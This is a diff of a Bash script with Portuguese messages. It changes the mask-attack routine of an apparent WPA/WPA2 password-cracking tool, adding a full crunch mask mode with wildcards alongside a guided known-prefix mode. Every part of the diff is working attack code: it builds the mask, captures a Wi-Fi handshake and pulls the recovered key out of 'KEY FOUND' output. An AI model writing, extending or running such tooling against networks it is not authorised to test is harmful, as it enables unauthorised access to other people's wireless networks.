@@ -501,36 +501,70 @@ ultimo_cap() {
 
 rota_mascara() {
     echo
-    echo "--- Rota A: ataque de máscara (prefixo conhecido) ---"
-    local tamanho prefixo tipo_restante placeholder
+    echo "--- Rota A: ataque de máscara ---"
+    local tamanho prefixo tipo_restante placeholder mascara modo restante i
 
-    read -rp "Tamanho total da senha (ex.: 12): " tamanho
-    read -rp "Prefixo conhecido (ex.: CRIPTO): " prefixo
+    echo "Como montar a máscara?"
+    echo "  [1] Máscara completa do crunch (parte conhecida em QUALQUER posição)"
+    echo "  [2] Modo guiado: prefixo conhecido + uma classe para o resto"
+    read -rp "Escolha: " modo
 
-    local restante=$(( tamanho - ${#prefixo} ))
-    if [[ $restante -lt 0 ]]; then
-        erro "Prefixo maior que o tamanho total. Abortando rota de máscara."
-        return 1
-    fi
-
-    echo "Tipo de caractere nas posições desconhecidas:"
-    echo "  [1] números (%)"
-    echo "  [2] maiúsculas (,)"
-    echo "  [3] minúsculas (@)"
-    echo "  [4] símbolos (^)"
-    read -rp "Escolha: " tipo_restante
-    case "$tipo_restante" in
-        1) placeholder="%" ;;
-        2) placeholder="," ;;
-        3) placeholder="@" ;;
-        4) placeholder="^" ;;
-        *) erro "Opção inválida."; return 1 ;;
+    case "$modo" in
+        1)
+            echo "Coringas (convenção do crunch) nas posições DESCONHECIDAS:"
+            echo "  %=número   ,=maiúscula   @=minúscula   ^=símbolo"
+            echo "Resto fica FIXO. Ex.: HEX%%123%% = HEX + 2 dígitos + 123 + 2 dígitos."
+            read -rp "Máscara: " mascara
+            if [[ -z "$mascara" ]]; then
+                erro "Máscara vazia. Abortando rota de máscara."
+                return 1
+            fi
+            # Tamanho = nº de posições de saída; \X (coringa escapado) conta como 1
+            local sem_escape="${mascara//\\/}"
+            tamanho=${#sem_escape}
+            if ! [[ "$mascara" =~ [%,@^] ]]; then
+                log "Aviso: máscara sem coringa (% , @ ^) — vai testar só essa senha fixa."
+            fi
+            ;;
+        2)
+            read -rp "Tamanho total da senha (ex.: 12): " tamanho
+            read -rp "Prefixo conhecido (ex.: CRIPTO): " prefixo
+            if ! [[ "$tamanho" =~ ^[0-9]+$ ]]; then
+                erro "Tamanho inválido. Abortando rota de máscara."
+                return 1
+            fi
+            restante=$(( tamanho - ${#prefixo} ))
+            if [[ $restante -lt 0 ]]; then
+                erro "Prefixo maior que o tamanho total. Abortando rota de máscara."
+                return 1
+            fi
+            echo "Tipo de caractere nas posições desconhecidas:"
+            echo "  [1] números (%)"
+            echo "  [2] maiúsculas (,)"
+            echo "  [3] minúsculas (@)"
+            echo "  [4] símbolos (^)"
+            read -rp "Escolha: " tipo_restante
+            case "$tipo_restante" in
+                1) placeholder="%" ;;
+                2) placeholder="," ;;
+                3) placeholder="@" ;;
+                4) placeholder="^" ;;
+                *) erro "Opção inválida."; return 1 ;;
+            esac
+            mascara="${prefixo}"
+            for ((i=0; i<restante; i++)); do mascara+="${placeholder}"; done
+            ;;
+        *)
+            erro "Opção inválida."
+            return 1
+            ;;
     esac
 
-    local mascara="${prefixo}"
-    for ((i=0; i<restante; i++)); do mascara+="${placeholder}"; done
+    if [[ "$tamanho" -lt 8 ]]; then
+        log "Aviso: WPA/WPA2 exige senha de 8+ caracteres — máscara de ${tamanho} dificilmente casa."
+    fi
 
-    log "Capturando handshake para rodar máscara '${mascara}'..."
+    log "Capturando handshake para rodar máscara '${mascara}' (tamanho ${tamanho})..."
     if ! capturar_handshake; then
         return 1
     fi
@@ -544,7 +578,7 @@ rota_mascara() {
         | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"
 
     if [[ -n "${SENHA_ENCONTRADA}" ]]; then
-        ROTA_USADA="Máscara (prefixo conhecido)"
+        ROTA_USADA="Máscara (crunch)"
         log "Senha encontrada via máscara: ${SENHA_ENCONTRADA}"
         return 0
     fi
